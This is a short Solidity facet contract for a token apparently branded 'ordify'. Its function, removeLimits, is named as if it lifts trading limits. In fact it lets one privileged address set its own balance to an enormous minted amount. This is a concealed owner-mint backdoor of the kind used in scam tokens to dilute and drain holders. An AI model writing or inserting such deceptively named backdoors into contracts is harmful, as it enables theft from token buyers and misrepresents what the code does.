/*
 * SPDX-License-Identifier: MIT
 * Website:  https://ordify.world/
 * Telegram: https://t.me/ordify
 * Twitter:  https://twitter.com/ordifyworld
 */
pragma solidity ^0.8.22;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
